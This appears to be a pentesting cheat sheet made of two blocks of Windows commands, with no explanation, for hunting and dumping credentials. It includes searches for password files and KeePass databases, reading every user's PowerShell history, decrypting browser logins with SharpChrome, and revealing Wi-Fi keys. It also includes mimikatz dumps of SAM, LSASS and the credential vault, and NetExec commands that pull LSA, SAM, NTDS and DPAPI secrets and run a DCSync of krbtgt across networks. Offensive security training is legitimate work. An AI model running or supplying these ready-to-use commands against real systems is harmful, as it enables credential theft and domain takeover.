```powershell
# 1-Searching For Password
findstr /SI /M "password" *.xml *.ini *.txt *.config
findstr /SI /M "ldapadmin" *.xml *.ini *.txt *.rdp
findstr /spin "ldap" .
where /R C:\ *.kdbx
where /R C:\ *.xml
where /R C:\ *confidential.txt
where /R C:\ *unattended.xml
where /R "C:\Department Shares" *
# 2-PowerShell History File
(Get-PSReadLineOption).HistorySavePath
gc (Get-PSReadLineOption).HistorySavePath

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
# 3-Sticky Notes Database Path
where /R C:\ *plum.sqlite
# 4-Cmdkey Saved Credentials
cmdkey /list
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
# 5-Chomium based browsers | FireFox
tree /f .
gci -force
cd appdata\roaming\microsoft\credentials
cd appdata\roaming\microsoft\protect\$sid
.\SharpChrome.exe logins /unprotect
where /R C:\ *logins.json
where /R C:\ *key4.db
# 6-Password Managers
where /R C:\ *.kdbx
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
# 7-Email
https://github.com/dafthack/MailSniper
Invoke-SelfSearch -Mailbox current-user@domain.com
# 8-SessionGopher
Import-Module .\SessionGopher.ps1
Invoke SessionGopher -Thorough
Invoke SessionGopher -Target WINLPE-SRV01
Invoke SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
# 9-Clear-Text Password Storage in the Registry
reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
reg.exe query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
# 10-Wifi Passwords
netsh wlan show profile
netsh wlan show profile <profile> key=clear
```
Post Exploitation!!!
```powershell
# sam
mimikatz.exe "lsadump::sam" "exit"
# lsass memory
mimikatz.exe "sekurlsa::ekeys" "exit"
# vault
mimikatz.exe "vault::cred /patch" "exit"
# logonpasswords
mimikatz.exe "sekurlsa::logonpasswords" "exit"
# netexec
nxc smb whiteflag.local -u Administrateur -p Defte@WF --lsa
nxc smb 192.168.1.0/24 -u User -p 'PWDHERE' --lsa secdump
nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
nxc smb 192.168.1.0/24 -u User -p 'PWDHERE' --sam secdump
nxc smb $dc -u UserName -p 'PASSWORDHERE' --ntds
nxc smb $dc -u UserName -p 'PASSWORDHERE' --ntds --enabled
nxc smb $dc -u UserName -p 'PASSWORDHERE' --ntds vss
nxc smb $dc -u User -p 'PWDHERE' --ntds --user Administrator
nxc smb $dc -u User -p 'PASSWORDHERE' -M ntdsutil
nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
nxc smb 192.168.255.131 -u administrator -p pass -M mimikatz
nxc smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"'
# dpapi
nxc smb <ip> -u user -p password --dpapi
nxc smb <ip> -u user -p password --dpapi cookies
nxc smb <ip> -u user -p password --dpapi nosystem
nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
```